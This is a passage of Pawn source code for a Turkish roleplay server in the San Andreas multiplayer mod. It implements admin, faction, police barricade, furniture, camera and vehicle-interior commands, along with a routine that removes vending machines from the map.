	    GetPlayerPos(playerid, markPos[playerid][0], markPos[playerid][1], markPos[playerid][2]);
	    markPosx[playerid][0] = GetPlayerInterior(playerid);
	    markPosx[playerid][1] = GetPlayerVirtualWorld(playerid);
	    Bilgi(playerid, "Hedef pozisyonu ayarladýnýz.");
	}
	else
	{
	    DONDUR(playerid);
	    SetPlayerPos(playerid, markPos[playerid][0], markPos[playerid][1], markPos[playerid][2]);
	    SetPlayerInterior(playerid, markPosx[playerid][0]);
	    SetPlayerVirtualWorld(playerid, markPosx[playerid][0]);
	    UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
	    Bilgi(playerid, "Hedef pozisyonunuza gittiniz.");
	    markPos[playerid][0] = 0;
	    markPos[playerid][1] = 0;
	    markPos[playerid][2] = 0;
	    markPosx[playerid][0] = 0;
	    markPosx[playerid][1] = 0;
	}
	return 1;
}

CMD:birlikdestek(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
	new nstring[16], _id;
	if(sscanf(params, "s[16]d", nstring, _id)) return Kullanim(playerid, "/birlikdestek [arac/ev/isyeri] [id]");
	if(Buysa(nstring, "arac"))
	{
		switch(Arac[_id][birlikdestek])
		{
			case 0:
			{
			    Arac[_id][birlikdestek] = 1;
			    Bilgi(playerid, "Aracý birlik desteðine dahil ettiniz.");
			}
			case 1:
			{
			    Arac[_id][birlikdestek] = 0;
			    Bilgi(playerid, "Aracý birlik desteðinden çýkardýnýz.");
			}
	 	}
	 	AracKaydet(_id);
	}
	else if(Buysa(nstring, "ev"))
	{
		switch(Ev[_id][birlikdestek])
		{
			case 0:
			{
			    Ev[_id][birlikdestek] = 1;
			    Bilgi(playerid, "Evi birlik desteðine dahil ettiniz.");
			}
			case 1:
			{
			    Ev[_id][birlikdestek] = 0;
			    Bilgi(playerid, "Evi birlik desteðinden çýkardýnýz.");
			}
	 	}
	 	EvKaydet(_id);
	}
	else if(Buysa(nstring, "isyeri"))
	{
		switch(Isyeri[_id][birlikdestek])
		{
			case 0:
			{
			    Isyeri[_id][birlikdestek] = 1;
			    Bilgi(playerid, "Ýþyerini birlik desteðine dahil ettiniz.");
			}
			case 1:
			{
			    Isyeri[_id][birlikdestek] = 0;
			    Bilgi(playerid, "Ýþyerini birlik desteðinden çýkardýnýz.");
			}
	 	}
	 	IsyeriKaydet(_id);
	}
	return 1;
}

CMD:pmengelle(playerid, params[])
{
	if(Girdi[playerid])
	{
	    new _pid;
	    if(sscanf(params,"d",_pid)) return Kullanim(playerid, "/pmengelle [oyuncuID] (Tüm oyuncularý engellemek için 999 yazýn.)");
		if(_pid == 999) {
			if(TumOyuncularEngelliEx(playerid)) {
                foreach(new i : Player)
	            {
	                PMengelle[playerid][i] = false;
	            }
	            TumOyuncularEngelli[playerid] = 0;
	            Bilgi(playerid, "Tüm oyuncularýn size PM atma engelini kaldýrdýnýz.");
			}
			else {
			    foreach(new i : Player)
	            {
	                PMengelle[playerid][i] = true;
	            }
	            TumOyuncularEngelli[playerid] = 1;
	            Bilgi(playerid, "Tüm oyuncularýn size PM atmasýný engellediniz.");
			}
			return 1;
		} else {
	    	if(!Girdi[_pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
			switch(PMengelle[playerid][_pid])
			{
				case 0:
				{
					PMengelle[playerid][_pid] = true;
					Bilgi(playerid, "Oyuncunun size PM atmasýný engellediniz.");
				}
				case 1:
				{
					PMengelle[playerid][_pid] = false;
					Bilgi(playerid, "Oyuncunun PM engelini kaldýrdýnýz.");
				}
			}
		}
	}
	return 1;
}

TumOyuncularEngelliEx(playerid) {
	return TumOyuncularEngelli[playerid];
}

stock OyuncuBanli(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `kilit` FROM `karakterler` WHERE `id` = '%d' AND `neden` != 'CK';",_sqlid);
	new Cache:result = mysql_query(query,true);
	if(cache_num_rows()) {
		_result = cache_get_row_int(0, 0);
	}
	cache_delete(result);
	return _result;
}

CMD:banliaraclar(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1) return 1;
	SendClientMessage(playerid, -1, "Banlý Oyuncularýn Araçlarý:");
	for(new i;i<MAX_VEHICLES;i++)
	{
	    if(Arac[i][aowner] == -1) continue;
	    if(OyuncuBanli(Arac[i][aowner]))
	    {
	        SendClientMessageEx(playerid, -1, "ID:%d - Oyuncu:%s",i, SQLFromName(Arac[i][aowner]));
	    }
	}
	return 1;
}

CMD:banlievler(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1) return 1;
	SendClientMessage(playerid, -1, "Banlý Oyuncularýn Evleri:");
	foreach(new i : Houses)
	{
	    if(Ev[i][esahip] == -1) continue;
	    if(OyuncuBanli(Ev[i][esahip]))
	    {
	        SendClientMessageEx(playerid, -1, "ID:%d - Oyuncu:%s",i, SQLFromName(Ev[i][esahip]));
	    }
	}
	return 1;
}

CMD:banliisyerleri(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1) return 1;
	SendClientMessage(playerid, -1, "Banlý Oyuncularýn Ýþyerleri:");
	foreach(new i : Business)
	{
	    if(Isyeri[i][isahip] == -1) continue;
	    if(OyuncuBanli(Isyeri[i][isahip]))
	    {
	        SendClientMessageEx(playerid, -1, "ID:%d - Oyuncu:%s",i, SQLFromName(Isyeri[i][isahip]));
	    }
	}
	return 1;
}

CMD:k9getir(playerid, params[]) {
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
 	{
	 	if(k9izin[playerid] == 1)
		{
			new petcount = 0;
			petcount = 1;
			if(petcount == 0)
			    return Hata(playerid, "Hiç hayvanýnýz yok.");
			new nstring[64];
			new mstring[128];
			mstring = "K9";
			format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Pet ["C1"%d"C8"]", petcount);
			ShowPlayerDialog(playerid, 423, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
		}
		else return Hata(playerid, "K9 çaðýrma yetkisine sahip deðilsiniz.");
	}
	return 1;
}

stock GetCoordsInFront(Float:x, Float:y, Float:a, Float:distance, &Float:res_x, &Float:res_y)
{
	res_x = x + (distance * floatsin(-a, degrees));
	res_y = y + (distance * floatcos(-a, degrees));
}

forward hayvanTakipEttirTimer(npcid, playerid);
public hayvanTakipEttirTimer(npcid, playerid) {
	new Float:pPos[4];
	GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	GetPlayerFacingAngle(playerid, pPos[3]);
    if (!IsPlayerInRangeOfPoint(npcid, 2.5, pPos[0], pPos[1], pPos[2])) {
		//FCNPC_GoToPlayer(npcid, playerid);
	}
	return 1;
}

forward cKameraAyarla(playerid, c_playerid);
public cKameraAyarla(playerid, c_playerid) {
	SetPlayerCameraPos(playerid, gKameraPosE[c_playerid][0], gKameraPosE[c_playerid][1], gKameraPosE[c_playerid][2]);
	SetPlayerCameraLookAt(playerid, gKameraPos[c_playerid][0], gKameraPos[c_playerid][1], gKameraPos[c_playerid][2]);
	return 1;
}
forward cKameraAyarlaEx(playerid, c_playerid);
public cKameraAyarlaEx(playerid, c_playerid) {
	SetPVarInt(playerid, "OyuncuKameraTimer", SetTimerEx("KameraUpdate" , 5 , 1 , "ii" , playerid , c_playerid));
	return 1;
}

forward GirisKameraAyarla(playerid);
public GirisKameraAyarla(playerid) {
    InterpolateCameraPos(playerid, 1306.345458, -1872.893920, 48.846801, 2100.956542, -1859.029296, 38.765197, 30000);
	InterpolateCameraLookAt(playerid, 1311.331176, -1872.725708, 48.508426, 2099.986816, -1854.294555, 37.483985, 30000);
}

forward KameraUpdate(playerid , c_player);
public KameraUpdate(playerid , c_player)
{
    if(gTvIzliyo[playerid])
    {
        if(gKameraKurdu[c_player] > 0)
        {
        	new Float:_x , Float:_y , Float:_z;
        	new Float:_xx, Float:_yy;
        	GetPlayerPos(c_player , _x , _y , _z);
    		GetXYInFrontOfPlayerEx(c_player , _xx , _yy , 0.6);
        	SetPlayerCameraPos(playerid , _xx ,_yy ,_z+0.8);
        	GetXYInFrontOfPlayerEx(c_player , _xx , _yy , 10.0);
        	SetPlayerCameraLookAt(playerid , _xx , _yy , _z+0.8);
        }
		else {
			KillTimer(GetPVarInt(playerid, "OyuncuKameraTimer"));
		    TogglePlayerSpectating(playerid, false);
		    gTvIzliyo[playerid] = false;
			DONDUR(playerid);
			SetPlayerPos(playerid, gTx[playerid], gTy[playerid], gTz[playerid]);
			SetPlayerInterior(playerid, gTint[playerid]);
			SetPlayerVirtualWorld(playerid, gTvw[playerid]);
			SetCameraBehindPlayer(playerid);
			SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
		}
    }
    return 1;
}

forward CCTV_Izlet(playerid, ccid);
public CCTV_Izlet(playerid, ccid) {
	/*SetPlayerCameraPos(playerid, CCTV[ccid][c_px], CCTV[ccid][c_py], CCTV[ccid][c_pz]);
	new Float:_a, Float:_b;
	GetXYInFrontOfPos(CCTV[ccid][c_px], CCTV[ccid][c_py], CCTV[ccid][c_angle], _a, _b, 5);
	SetPlayerCameraLookAt(playerid, _a, _b, CCTV[ccid][c_pz]-2);
	SetPVarFloat(playerid, "CCTVCameraX", _a);
	SetPVarFloat(playerid, "CCTVCameraY", _b);
	SetPVarFloat(playerid, "CCTVCameraZ", CCTV[ccid][c_pz]-2);*/
	SetPlayerCamera(playerid, 2);
}

/*CMD:aaaisimsil(playerid, params[])
{
new userID;
    if(sscanf(params, "u", userID))
		{
			return SendClientMessage(playerid, -1, "/aisimsil [ID]");
		}
	if(Karakter[playerid][adminlevel] < 3) return 0;
        DestroyDynamic3DTextLabel(tanismaIsim[userID]);
        DestroyDynamic3DTextLabel(tanismaHP[userID]);
	return 1;
}
CMD:aaaisimgoster(playerid, params[])
{
new userID;
    if(sscanf(params, "u", userID))
		{
			return SendClientMessage(playerid, -1, "/aisimgoster [ID]");
		}
	if(Karakter[playerid][adminlevel] < 3) return 0;
        //tanismaIsim[userID] = CreateDynamic3DTextLabel("isim", COLOR_WHITE, 0.0, 0.0, 0.099, 15.0, userID, .testlos=1);
        //tanismaHP[userID] = CreateDynamic3DTextLabel("hpbar", 0x00B900FF, 0.0, 0.0, 0.010, 15.0, userID, .testlos=1);
	return 1;
}*/

AracParcala(vid) { UpdateVehicleDamageStatus(vid, encode_panels(1,1,1,1,1,1,1), encode_doors(4,4,4,4,4,4), 69, 15); SetVehicleHealth(vid, 400); Arac[vid][parcalandi] = 1; return 1; }

CalinabilirArac(vid) {
    new _x_bol[5][4];
    strexplode(_x_bol, Veriler[aractahta], ",");
	for(new i=0;i<5;i++) {
		if(GetVehicleModel(vid) == strval(_x_bol[i]))
		    return 1;
	}
	return 0;
}

stock AracTahtaEx() {
	new mstring[128];
	new _x_bol[5][4];
	strexplode(_x_bol, Veriler[aractahta], ",");
	for(new i=0;i<5;i++)
	{
		if(strval(_x_bol[i]) < 400 || strval(_x_bol[i]) > 611)
		{
			_x_bol[i] = "612";
		}
	}
 	format(mstring, sizeof(mstring), "%s\n%s\n%s\n%s\n%s",
	VehicleName[strval(_x_bol[0])-400][0],VehicleName[strval(_x_bol[1])-400][0],VehicleName[strval(_x_bol[2])-400][0],VehicleName[strval(_x_bol[3])-400][0],VehicleName[strval(_x_bol[4])-400][0]);
	return mstring;
}

CMD:esya(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new nstring[16];
	if(sscanf(params,"s[16]",nstring)) return Kullanim(playerid, "/esya [fonksiyon]"),SendClientMessage(playerid, -1, ""C3"Kullanýlabilir fonksiyonlar: tasi, birak, aracal, sat");
	if(Buysa(nstring,"tasi")) {
		new mesafe = EvIceridenMesafesi(playerid);
        if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
		SetPVarInt(playerid, "EsyaSeciyor", 1);
		SetPVarInt(playerid, "EsyaSeciyorevID", mesafe);
		SelectObject(playerid);
	}
	else if(Buysa(nstring,"birak")) {
		if(GetPVarType(playerid, "EsyaTasiModel") == 0) return Hata(playerid, "Eþya taþýmýyorsunuz.");
        new veh = GetNearestVehicle(playerid);
	    if(!IsValidVehicle(veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	    if(!IsLoadableVehicle(veh)) return Hata(playerid, "Bu araca eþya býrakamazsýnýz.");
	    if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	    if(EsyaSay(veh) == 10) return Hata(playerid, "Araçta yer yok.");
	    RemovePlayerAttachedObject(playerid, 9);
	    AracEsyaBirak(veh, Mobilya[GetPVarInt(playerid, "EsyaTasiID")][mid]);
	    DeletePVar(playerid, "EsyaTasiID");
	    DeletePVar(playerid, "EsyaTasiModel");
	    Bilgi(playerid, "Eþyayý araca býraktýnýz.");
	    ClearAnimations(playerid);
    	SetPlayerSpecialAction(playerid, 0);
	}
	else if(Buysa(nstring, "aracal")) {
		new mstring[1024],query[128];
		new veh = GetNearestVehicle(playerid);
		if(!IsValidVehicle(veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	    if(!IsLoadableVehicle(veh)) return Hata(playerid, "Bu aractan eþya alamazsýnýz.");
	    if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	    if(EsyaSay(veh) == 0) return Hata(playerid, "Araçta eþya yok.");
		SetPVarInt(playerid, "EsyaAracID", veh);
		format(query, sizeof(query), "SELECT * FROM `mobilya` WHERE `aracid` = '%d'",Arac[veh][aid]);
		new Cache:cache = mysql_query(query,true);
		new rows, fields;
		cache_get_data(rows, fields, g_iHandle);
		for(new i=0;i<rows;i++)
		{
		    format(mstring, sizeof(mstring), "%s"NOKTA" Model:\t%d\n",mstring, cache_get_field_content_int(i, "model"));
		}
		cache_delete(cache);
		ShowPlayerDialog(playerid, 438, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Eþya (Araç Al)", mstring, "Al", "Ýptal");
	}
	else if(Buysa(nstring, "sat")) {
		if(GetPVarType(playerid, "EsyaTasiID") == 0) return Hata(playerid, "Eþya taþýmýyorsunuz.");
		new yakindaki = IsyeriIceridenMesafesi(20.0,playerid);
		if(yakindaki == 0 || Isyeri[yakindaki][itip] != 17) return Hata(playerid, "Rehinci dükkanýnýn içinde deðilsiniz.");
		GivePlayerCash(playerid, 75);
		RemovePlayerAttachedObject(playerid, 9);
		SetPlayerSpecialAction(playerid, 0);
		Bilgi(playerid, "Eþyayý sattýnýz.");
		DeletePVar(playerid, "EsyaTasiID");
		new _q_uery[128];
		format(_q_uery, sizeof(_q_uery), "DELETE FROM `mobilya` WHERE `id` = '%d'", Mobilya[GetPVarInt(playerid, "EsyaTasiID")][mid]);
		mysql_tquery(1, _q_uery);
	}
	return 1;
}

EsyaSay(veh)
{
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `mobilya` WHERE `aracid` = '%d'",Arac[veh][aid]);
	new Cache:cache = mysql_query(query,true);
	new rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	cache_delete(cache);
	return rows;
}

AracEsyaBirak(veh, _mid) {
	new query[128];
	format(query, sizeof(query), "UPDATE `mobilya` SET `aracid` = '%d' WHERE `id` = '%d'", Arac[veh][aid], _mid);
	mysql_tquery(1, query);
}

stock EscapeString(const string[])
{
	new escpass[512];
	mysql_real_escape_string(string, escpass);
	return escpass;
}

SQLGuvenlikAyar(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `guvenlikayari` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLGuvenlikDurum(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `guvenlikdurumu` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

NPCCount() {
	new count=0;
	for(new i=0;i<MAX_PLAYERS;i++) {
		if(IsPlayerNPC(i)) count++;
	}
	return count;
}

forward hayvanAyarla(playerid);
public hayvanAyarla(playerid) {
	new string[32],name[32];
	GetPlayerName(playerid, name, 32);
	format(string, 32, "%s_K9",name);
	strreplace(string, "_", " ");
	new _id = GetMaxPlayers()-NPCCount();
	SetPlayerSkin(_id, 25196);
	Streamer_Update(playerid);
 	Bilgi(playerid, "K9 Köpeði çaðýrýldý.");
 	return 1;
}

GetVehicleDriver(vehicleid)
{
	foreach(new i : Player)
  	{
    	if (IsPlayerInVehicle(i, vehicleid))
    	{
      		if(GetPlayerState(i) == 2)
      		{
				return i;
      		}
		}
  	}
  	return -1;
}

RemoveVendingMachines(playerid)
{
    RemoveBuildingForPlayer(playerid, 956, 1634.1487,-2238.2810,13.5077, 20.0); //Snack vender @ LS Airport
    RemoveBuildingForPlayer(playerid, 956, 2480.9885,-1958.5117,13.5831, 20.0); //Snack vender @ Sushi Shop in Willowfield
    RemoveBuildingForPlayer(playerid, 955, 1729.7935,-1944.0087,13.5682, 20.0); //Sprunk machine @ Unity Station
    RemoveBuildingForPlayer(playerid, 955, 2060.1099,-1898.4543,13.5538, 20.0); //Sprunk machine opposite Tony's Liqour in Willowfield
    RemoveBuildingForPlayer(playerid, 955, 2325.8708,-1645.9584,14.8270, 20.0); //Sprunk machine @ Ten Green Bottles
    RemoveBuildingForPlayer(playerid, 955, 1153.9130,-1460.8893,15.7969, 20.0); //Sprunk machine @ Market
    RemoveBuildingForPlayer(playerid, 955,1788.3965,-1369.2336,15.7578, 20.0); //Sprunk machine in Downtown Los Santos
    RemoveBuildingForPlayer(playerid, 955, 2352.9939,-1357.1105,24.3984, 20.0); //Sprunk machine @ Liquour shop in East Los Santos
    RemoveBuildingForPlayer(playerid, 1775, 2224.3235,-1153.0692,1025.7969, 20.0); //Sprunk machine @ Jefferson Motel
    RemoveBuildingForPlayer(playerid, 956, 2140.2566,-1161.7568,23.9922, 20.0); //Snack machine @ pick'n'go market in Jefferson
    RemoveBuildingForPlayer(playerid, 956, 2154.1199,-1015.7635,62.8840, 20.0); //Snach machine @ Carniceria El Pueblo in Las Colinas
    RemoveBuildingForPlayer(playerid, 956, 662.5665,-551.4142,16.3359, 20.0); //Snack vender at Dillimore Gas Station
    RemoveBuildingForPlayer(playerid, 955, 200.2010,-107.6401,1.5513, 20.0); //Sprunk machine @ Blueberry Safe House
    RemoveBuildingForPlayer(playerid, 956, 2271.4666,-77.2104,26.5824, 20.0); //Snack machine @ Palomino Creek Library
    RemoveBuildingForPlayer(playerid, 955, 1278.5421,372.1057,19.5547, 20.0); //Sprunk machine @ Papercuts in Montgomery
    RemoveBuildingForPlayer(playerid, 955, 1929.5527,-1772.3136,13.5469, 20.0); //Sprunk machine @ Idlewood Gas Station

    //San Fierro
    RemoveBuildingForPlayer(playerid, 1302, -2419.5835,984.4185,45.2969, 20.0); //Soda machine 1 @ Juniper Hollow Gas Station
    RemoveBuildingForPlayer(playerid, 1209, -2419.5835,984.4185,45.2969, 20.0); //Soda machine 2 @ Juniper Hollow Gas Station
    RemoveBuildingForPlayer(playerid, 956, -2229.2075,287.2937,35.3203, 20.0); //Snack vender @ King's Car Park
    RemoveBuildingForPlayer(playerid, 955, -1349.3947,493.1277,11.1953, 20.0); //Sprunk machine @ SF Aircraft Carrier
    RemoveBuildingForPlayer(playerid, 956, -1349.3947,493.1277,11.1953, 20.0); //Snack vender @ SF Aircraft Carrier
    RemoveBuildingForPlayer(playerid, 955, -1981.6029,142.7232,27.6875, 20.0); //Sprunk machine @ Cranberry Station
    RemoveBuildingForPlayer(playerid, 955, -2119.6245,-422.9411,35.5313, 20.0); //Sprunk machine 1/2 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2097.3696,-397.5220,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2068.5593,-397.5223,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2039.8802,-397.5214,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2011.1403,-397.5225,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2005.7861,-490.8688,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2034.5267,-490.8681,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2063.1875,-490.8687,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium
    RemoveBuildingForPlayer(playerid, 955, -2091.9780,-490.8684,35.5313, 20.0); //Sprunk machine 3 @ SF Stadium

    //Las Venturas
    RemoveBuildingForPlayer(playerid, 956, -1455.1298,2592.4138,55.8359, 20.0); //Snack vender @ El Quebrados GONE
    RemoveBuildingForPlayer(playerid, 955, -252.9574,2598.9048,62.8582, 20.0); //Sprunk machine @ Las Payasadas GONE
    RemoveBuildingForPlayer(playerid, 956, -252.9574,2598.9048,62.8582, 20.0); //Snack vender @ Las Payasadas GONE
    RemoveBuildingForPlayer(playerid, 956, 1398.7617,2223.3606,11.0234, 20.0); //Snack vender @ Redsands West GONE
    RemoveBuildingForPlayer(playerid, 955, -862.9229,1537.4246,22.5870, 20.0); //Sprunk machine @ The Smokin' Beef Grill in Las Barrancas GONE
    RemoveBuildingForPlayer(playerid, 955, -14.6146,1176.1738,19.5634, 20.0); //Sprunk machine @ Fort Carson GONE
    RemoveBuildingForPlayer(playerid, 956, -75.2839,1227.5978,19.7360, 20.0); //Snack vender @ Fort Carson GONE
    RemoveBuildingForPlayer(playerid, 955, 1519.3328,1055.2075,10.8203, 20.0); //Sprunk machine @ LVA Freight Department GONE
    RemoveBuildingForPlayer(playerid, 956, 1659.5096,1722.1096,10.8281, 20.0); //Snack vender near Binco @ LV Airport GONE
    RemoveBuildingForPlayer(playerid, 955, 2086.5872,2071.4958,11.0579, 20.0); //Sprunk machine @ Sex Shop on The Strip
    RemoveBuildingForPlayer(playerid, 955, 2319.9001,2532.0376,10.8203, 20.0); //Sprunk machine @ Pizza co by Julius Thruway (North)
    RemoveBuildingForPlayer(playerid, 955, 2503.2061,1244.5095,10.8203, 20.0); //Sprunk machine @ Club in the Camels Toe
    RemoveBuildingForPlayer(playerid, 956, 2845.9919,1294.2975,11.3906, 20.0); //Snack vender @ Linden Station

    //Interiors: 24/7 and Clubs
    RemoveBuildingForPlayer(playerid, 1775, 496.0843,-23.5310,1000.6797, 20.0); //Sprunk machine 1 @ Club in Camels Toe
    RemoveBuildingForPlayer(playerid, 1775, 501.1219,-2.1968,1000.6797, 20.0); //Sprunk machine 2 @ Club in Camels Toe
    RemoveBuildingForPlayer(playerid, 1776, 501.1219,-2.1968,1000.6797, 20.0); //Snack vender @ Club in Camels Toe
   	RemoveBuildingForPlayer(playerid, 1775, -19.2299,-57.0460,1003.5469, 20.0); //Sprunk machine @ Roboi's type 24/7 stores
	RemoveBuildingForPlayer(playerid, 1776, -35.9012,-57.1345,1003.5469, 20.0); //Snack vender @ Roboi's type 24/7 stores
	RemoveBuildingForPlayer(playerid, 1775, -17.0036,-90.9709,1003.5469, 20.0); //Sprunk machine @ Other 24/7 stores
	RemoveBuildingForPlayer(playerid, 1776, -17.0036,-90.9709,1003.5469, 20.0); //Snach vender @ Others 24/7 stores
	return 1;
}

CMD:barikat(playerid, params[]) {
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI || Birlik[Karakter[playerid][birlik]][ftip] == LSFD) {
    	if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 0) || (Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] == 0)) return Hata(playerid, "Ýþbaþý deðilsiniz.");
		new nstring[16],bid=-1;
	    sscanf(params,"s[16]d",nstring,bid);
	    if(isnull(nstring)) { Kullanim(playerid, "/barikat [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir, kaldirid, bilgi, duzenle, liste"); return 1; }
	    if(Buysa(nstring,"kur")) {
	        if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI) ShowModelSelectionMenu(playerid, barikatliste, "Barikatlar");
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD) ShowModelSelectionMenu(playerid, fdbarikatliste, "Barikatlar");
			Bilgi(playerid, "Barikat tipini seçin ve devam edin.");
	    }
	    else if(Buysa(nstring,"kaldir")) {
            SetPVarInt(playerid, "Barikat_IslemID", 2);
	        SelectObject(playerid);
	        Bilgi(playerid, "Kaldýrmak istediðiniz barikatý seçiniz.");
	        Bilgi(playerid, "Space tuþuna basýlý tutarak ekraný çevirebilirsiniz.");
	        Bilgi(playerid, "Bu moddan çýkmak için ESC tuþuna basýnýz.");
		}
		else if(Buysa(nstring,"bilgi")) {
		    SetPVarInt(playerid, "Barikat_IslemID", 0);
	        SelectObject(playerid);
	        Bilgi(playerid, "Bilgi almak istediðiniz barikatý seçiniz.");
	        Bilgi(playerid, "Space tuþuna basýlý tutarak ekraný çevirebilirsiniz.");
	        Bilgi(playerid, "Bu moddan çýkmak için ESC tuþuna basýnýz.");
		}
		else if(Buysa(nstring,"duzenle")) {
            SetPVarInt(playerid, "Barikat_IslemID", 1);
	        SelectObject(playerid);
	        Bilgi(playerid, "Düzenlemek istediðiniz barikatý seçiniz.");
	        Bilgi(playerid, "F tuþuna basýlý tutarak ekraný çevirebilirsiniz.");
	        Bilgi(playerid, "Bu moddan çýkmak için ESC tuþuna basýnýz.");
		}
		else if(Buysa(nstring,"liste")) {
		    SendClientMessage(playerid, -1, "Kurduðunuz Barikatlar:");
		    new bool:bkurdu=false;
		    for(new i=0;i<MAX_BARIKAT;i++) {
				if(Barikat[i][o_id] == Karakter[playerid][sqlid]) {
					bkurdu=true;
					SendClientMessageEx(playerid, -1, "Sistem ID: %d - X: %f - Y: %f - Z: %f", i, Barikat[i][bx], Barikat[i][by], Barikat[i][bz]);
				}
			}
			if(!bkurdu) Hata(playerid, "Hiç barikat kurmamýþsýnýz.");
		}
		else if(Buysa(nstring,"kaldirid")) {
		    if(bid == -1) return Kullanim(playerid, "/barikat kaldirid [barikat id]");
			if(Barikat[bid][o_id] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu barikatý siz oluþturmamýþsýnýz.");
            BarikatSil(bid);
		    Streamer_Update(playerid);
			Bilgi(playerid, "Barikat silindi.");
		}
	}
	return 1;
}

SetWorldTimeEx(_time) {
	if(_time >= 18 && _time <= 24) {
		switch(_time) {
			case 18: SetWorldTime(21);
			case 19: SetWorldTime(22);
			case 20: SetWorldTime(23);
			case 21..24: SetWorldTime(24);
		}
	}
	else SetWorldTime(_time);
}

CMD:deepweb(playerid) {
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == 9 || Birlik[Karakter[playerid][birlik]][ftip] == 10 || Birlik[Karakter[playerid][birlik]][ftip] == 11 || Birlik[Karakter[playerid][birlik]][ftip] == 13 || Birlik[Karakter[playerid][birlik]][ftip] == 14) {
		new query[64],mstring[128];
		format(query, sizeof(query), "SELECT * FROM `deepweb`");
		new Cache:cache = mysql_query(query,true);
		new rows, fields, ilanadi[64];
		cache_get_data(rows, fields, g_iHandle);
		for(new i;i<rows;i++){
			cache_get_field_content(i, "ilanadi", ilanadi);
			format(mstring, sizeof(mstring), "%sÝlan: %s\n", mstring, ilanadi);
			ShowPlayerDialog(playerid, 442, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"DeepWeb", mstring, "Seç", "Ýptal");
		}
		cache_delete(cache);
		if(!rows) return Hata(playerid, "Herhangi bir deepweb ilaný bulunmamaktadýr.");
	}
	return 1;
}

stock CanEx(playerid)
{
	new
		__string[6],Float:__hp;
	GetPlayerHealth(playerid, __hp);
	format(__string, sizeof(__string), "%d", floatround(__hp));
	return __string;
}

stock ZirhEx(playerid)
{
	new
		__string[6],Float:__hp;
	GetPlayerArmour(playerid, __hp);
	format(__string, sizeof(__string), "%d", floatround(__hp));
	return __string;
}

CMD:shamal(playerid) {
	if(!Girdi[playerid]) return 1;
	new vid=GetNearestVehicle(playerid);
    if(GetVehicleModel(vid) == 519)
	{
	    DONDUR(playerid);
	    SetPlayerPos(playerid, 2.6972,33.3093,1199.5938);
	    SetPlayerInterior(playerid, 1);
	    SetPlayerVirtualWorld(playerid, vid);
	    UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
	}
	else return Hata(playerid, "Shamal'ýn yakýnýnda deðilsiniz.");
	return 1;
}

CMD:karavan(playerid) {
	if(!Girdi[playerid]) return 1;
	new vid=GetPlayerVehicleID(playerid);
	if(!IsValidVehicle(vid)) return 1;
	if(GetVehicleModel(vid) == 508)
	{
	    DONDUR(playerid);
	    SetPlayerPos(playerid, 2.0582 ,-2.9572, 999.4284);
	    SetPlayerInterior(playerid, 2);
	    SetPlayerVirtualWorld(playerid, vid);
	    UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
	}
	return 1;
}

CMD:ekip(playerid, params[]) {
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 1;
